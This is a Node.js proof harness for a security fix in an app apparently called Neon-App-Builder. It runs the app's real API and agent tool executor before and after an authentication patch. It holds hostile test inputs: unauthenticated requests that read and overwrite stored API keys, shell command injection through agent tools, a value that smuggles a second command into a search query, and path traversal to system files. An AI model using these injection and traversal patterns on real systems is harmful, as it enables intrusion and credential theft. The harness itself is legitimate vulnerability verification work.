// Proof harness: exercises the REAL repo code (api router + ToolExecutor).
// Usage: node proof/harness.mjs <before|after>
import express from 'express';
import fs from 'fs';
import path from 'path';

const phase = process.argv[2] || 'before';
const DATA = path.join(process.cwd(), '.data');
fs.mkdirSync(DATA, { recursive: true });
// FAKE secrets so the leak is visible without exposing anything real.
fs.writeFileSync(path.join(DATA, 'keys.json'), JSON.stringify({
  gemini: 'AIzaSyFAKE-gemini-0123456789abcdefABCDEF',
  openai: 'sk-proj-FAKE0123456789abcdefghijklmnopqrstuv',
  deepseek: 'sk-FAKEdeepseek0123456789',
  activeModel: 'gemini'
}, null, 2));
try { fs.unlinkSync('/tmp/neon-rce-proof'); } catch {}

const TOKEN = 'test-secret-token-123';
process.env.APP_AUTH_TOKEN = TOKEN;
delete process.env.ENABLE_SHELL_TOOL; // default config, as shipped

const { register } = await import('tsx/esm/api');
register();
const { apiRouter } = await import('../server/api.ts');
const { ToolExecutor } = await import('../server/tools.ts');

const app = express();
app.use(express.json());
if (phase === 'after') {
  const { requireAuth } = await import('../server/auth.ts');
  app.use('/api', requireAuth, apiRouter);   // mirrors fixed server.ts
} else {
  app.use('/api', apiRouter);                // mirrors original server.ts
}
const server = app.listen(4555, '127.0.0.1');
await new Promise(r => setTimeout(r, 300));

async function hit(method, pathname, headers = {}, body) {
  const res = await fetch('http://127.0.0.1:4555' + pathname, {
    method, headers: { 'Content-Type': 'application/json', ...headers },
    body: body ? JSON.stringify(body) : undefined });
  let b; const t = await res.text(); try { b = JSON.parse(t); } catch { b = t; }
  return `HTTP ${res.status}  ${JSON.stringify(b)}`;
}
const clip = s => String(s).slice(0, 400);
const auth = { Authorization: 'Bearer ' + TOKEN };

console.log(`=== Neon-App-Builder proof · phase: ${phase.toUpperCase()} ===\n`);
console.log('[1] GET /api/keys (no auth)            ->', await hit('GET', '/api/keys'));
console.log('[2] GET /api/history (no auth)         ->', await hit('GET', '/api/history'));
console.log('[3] POST /api/keys overwrite (no auth) ->', await hit('POST', '/api/keys', {}, { openai: 'sk-ATTACKER-key' }));
console.log('[4] GET /api/keys (wrong token)        ->', await hit('GET', '/api/keys', { Authorization: 'Bearer nope' }));
console.log('[5] GET /api/keys (valid token)        ->', await hit('GET', '/api/keys', auth));
console.log('[6] GET /api/history (valid token)     ->', await hit('GET', '/api/history', auth));

console.log('\n[7] agent tool execute_command "id; echo PWNED > /tmp/neon-rce-proof"');
console.log('   ', clip(await ToolExecutor.execute({ name: 'execute_command', arguments: { command: 'id; echo PWNED > /tmp/neon-rce-proof' } })).replace(/\n+/g, ' | '));
console.log('    /tmp/neon-rce-proof exists?', fs.existsSync('/tmp/neon-rce-proof'));

console.log('\n[8] agent tool search_code injection  query=\'zz" /dev/null; echo INJECTED-$(whoami); echo "\'');
console.log('   ', clip(await ToolExecutor.execute({ name: 'search_code', arguments: { query: 'zz" /dev/null; echo INJECTED-$(whoami); echo "', path: 'server' } })).replace(/\n+/g, ' | '));

console.log('\n[9] agent tool read_file path traversal "../../../../etc/hostname"');
console.log('   ', clip(await ToolExecutor.execute({ name: 'read_file', arguments: { path: '../../../../etc/hostname' } })).replace(/\n+/g, ' | '));

console.log('\n[10] agent tool background command "sleep 0; id"');
console.log('   ', clip(await ToolExecutor.execute({ name: 'execute_background_command', arguments: { command: 'sleep 0; id' } })).replace(/\n+/g, ' | '));

console.log('\n[11] POST /api/keys with a blank openai field (valid token) must NOT wipe the stored key');
console.log('    ', await hit('POST', '/api/keys', auth, { openai: '', activeModel: 'openai' }));
const stored = JSON.parse(fs.readFileSync(path.join(DATA, 'keys.json'), 'utf-8'));
console.log('    stored openai key still present?', typeof stored.openai === 'string' && stored.openai.length > 0, '| activeModel =', stored.activeModel);

server.close();
process.exit(0);
